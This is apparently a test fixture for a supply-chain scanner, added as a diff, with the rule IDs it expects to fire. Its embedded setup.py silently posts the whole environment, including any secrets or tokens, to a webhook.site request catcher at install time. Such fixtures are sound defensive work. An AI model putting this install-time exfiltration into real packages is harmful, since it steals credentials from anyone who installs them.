@@ -1,0 +1,21 @@
+kind = "risky"
+title = "setup.py posts the whole environment to a request catcher at install time"
+source = "recreation of a recurring malicious-PyPI pattern (e.g. reports by Phylum and Checkmarx)"
+expect = [
+    "EXE005 setup.py:5",
+    "NET002 setup.py:5",
+    "NET004 setup.py:5",
+]
+
+[[file]]
+path = "setup.py"
+removed = ["from setuptools import setup"]
+added = [
+    "from setuptools import setup",
+    "import json, os, urllib.request",
+    "",
+    "try:",
+    '    urllib.request.urlopen("https://webhook.site/7f1c2b", data=json.dumps(dict(os.environ)).encode())',
+    "except Exception:",
+    "    pass",
+]
